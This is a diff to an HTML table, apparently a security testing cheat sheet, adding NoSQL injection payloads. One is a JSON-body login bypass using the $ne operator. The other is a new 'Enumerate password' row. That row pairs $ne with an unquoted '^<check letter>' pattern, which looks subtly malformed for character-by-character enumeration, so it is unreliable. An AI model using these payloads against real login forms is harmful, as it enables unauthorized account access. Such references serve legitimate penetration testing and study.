@@ -970,7 +970,16 @@ layout: default
 	<table>
 		<tr>
 			<td>Login bypass</td>
-			<td>username=admin&password[$ne]=anything</td>
+			<td>
+				<li>username=admin&password[$ne]=anything</li>
+				<li>{&quot;username&quot;: &quot;&lt;username&gt;&quot;, &quot;password&quot;: {&quot;$ne&quot;: &lt;anything&gt;}}</li>
+			</td>
+		</tr>
+		<tr>
+			<td>Enumerate password</td>
+			<td>
+				{&quot;username&quot;: &quot;&lt;username&gt;&quot;, &quot;password&quot;: {&quot;$ne&quot;: ^&lt;check letter&gt;}}
+			</td>
 		</tr>
 	</table>
 
